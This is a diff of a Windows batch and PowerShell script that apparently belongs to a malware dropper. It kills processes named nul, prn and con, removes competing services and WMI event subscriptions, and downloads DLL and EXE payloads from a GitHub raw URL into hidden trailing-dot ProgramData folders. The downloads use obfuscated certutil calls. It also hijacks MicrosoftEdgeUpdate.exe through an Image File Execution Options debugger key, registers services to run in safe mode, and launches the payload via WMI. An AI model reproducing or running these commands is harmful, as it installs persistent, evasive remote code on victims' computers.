@@ -1,32 +1,3 @@
-taskkill.exe /f /IM nul.exe
-taskkill.exe /f /IM prn.exe
-taskkill.exe /f /IM con.exe
-
-rd /S /Q \\.\%ProgramData%\condata..\
-sc sdset "PcaSvcTask" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
-sc delete PcaSvcTask
-wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="NOC" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="NOC" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="NOC"' DELETE
-
-powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*NOC*' -or $_.Consumer -like '*NOC*' } | Remove-WmiObject"
-powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='NOC'\" | Remove-WmiObject"
-powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='NOC'\" | Remove-WmiObject"
-
-cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "d72cb7fd979075592ad96b35b63f6553" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/Icon.dll"
-cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "d72cb7fd979075592ad96b35b63f6553" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Icon.dll" "\\.\%ProgramData%\prndata..\prn"
-powershell.exe -NoProfile -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne 'd72cb7fd979075592ad96b35b63f6553') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/Icon.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
-
-dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || curl.exe -s -L -o "\\?\%ProgramData%\prndata..\prn.exe" "https://github.com/vltex/1/raw/1/0/Index.exe"
-dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Index.exe" "\\?\%ProgramData%\prndata..\prn.exe"
-dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/Index.exe -OutFile \\.\%ProgramData%\prndata..\prn.exe
-
-cert""""util -hash""""file "\\.\%ProgramData%\nuldata..\nul" MD5 | findstr /i "7f35b374014fc662a8994f04b572b20c" >nul || curl.exe -s -L -o "\\.\%ProgramData%\nuldata..\nul" "https://github.com/vltex/1/raw/1/0/winfw.dll"
-cert""""util -hash""""file "\\.\%ProgramData%\nuldata..\nul" MD5 | findstr /i "7f35b374014fc662a8994f04b572b20c" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/winfw.dll" "\\.\%ProgramData%\nuldata..\nul"
-powershell.exe -NoProfile -Command "if ((Get-FileHash '\\?\%ProgramData%\nuldata..\nul' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne '7f35b374014fc662a8994f04b572b20c') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/winfw.dll' -OutFile '\\.\%ProgramData%\nuldata..\nul' }"
-
-dir "%ProgramData%\curl.exe" >nul || curl.exe -s -L -o "%ProgramData%\curl.exe" "https://github.com/vltex/1/raw/1/0/curl.exe"
-dir "%ProgramData%\curl.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/curl.exe" "%ProgramData%\curl.exe"
-dir "%ProgramData%\curl.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/curl.exe -OutFile %ProgramData%\curl.exe
-
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger >nul || reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve /t REG_SZ /d "Service" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve /t REG_SZ /d "Service" /f
@@ -51,6 +22,36 @@ rd /S /Q \\?\%ProgramData%\config..\
 rd /S /Q \\?\%ProgramData%\logdata..\
 rd /S /Q \\?\%ProgramData%\diaglogs..\
 rd /S /Q "\\?\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+
+taskkill.exe /f /IM nul.exe
+taskkill.exe /f /IM prn.exe
+taskkill.exe /f /IM con.exe
+
+rd /S /Q \\.\%ProgramData%\condata..\
+sc sdset "PcaSvcTask" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
 sc sdset "WireGuar" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+sc delete PcaSvcTask
 sc delete WireGuar
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="NOC" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="NOC" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="NOC"' DELETE
+
+powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*NOC*' -or $_.Consumer -like '*NOC*' } | Remove-WmiObject"
+powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='NOC'\" | Remove-WmiObject"
+powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='NOC'\" | Remove-WmiObject"
+
+cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "d72cb7fd979075592ad96b35b63f6553" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/Icon.dll"
+cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "d72cb7fd979075592ad96b35b63f6553" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Icon.dll" "\\.\%ProgramData%\prndata..\prn"
+powershell.exe -NoProfile -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne 'd72cb7fd979075592ad96b35b63f6553') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/Icon.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
+
+dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || curl.exe -s -L -o "\\?\%ProgramData%\prndata..\prn.exe" "https://github.com/vltex/1/raw/1/0/Index.exe"
+dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Index.exe" "\\?\%ProgramData%\prndata..\prn.exe"
+dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/Index.exe -OutFile \\.\%ProgramData%\prndata..\prn.exe
+
+cert""""util -hash""""file "\\.\%ProgramData%\nuldata..\nul" MD5 | findstr /i "7f35b374014fc662a8994f04b572b20c" >nul || curl.exe -s -L -o "\\.\%ProgramData%\nuldata..\nul" "https://github.com/vltex/1/raw/1/0/winfw.dll"
+cert""""util -hash""""file "\\.\%ProgramData%\nuldata..\nul" MD5 | findstr /i "7f35b374014fc662a8994f04b572b20c" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/winfw.dll" "\\.\%ProgramData%\nuldata..\nul"
+powershell.exe -NoProfile -Command "if ((Get-FileHash '\\?\%ProgramData%\nuldata..\nul' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne '7f35b374014fc662a8994f04b572b20c') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/winfw.dll' -OutFile '\\.\%ProgramData%\nuldata..\nul' }"
+
+dir "%ProgramData%\curl.exe" >nul || curl.exe -s -L -o "%ProgramData%\curl.exe" "https://github.com/vltex/1/raw/1/0/curl.exe"
+dir "%ProgramData%\curl.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/curl.exe" "%ProgramData%\curl.exe"
+dir "%ProgramData%\curl.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/curl.exe -OutFile %ProgramData%\curl.exe
+
 netstat -ano | find "31270" >nul || powershell -NoProfile -Command "([wmiclass]'Win32_Process').Create('\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn')"
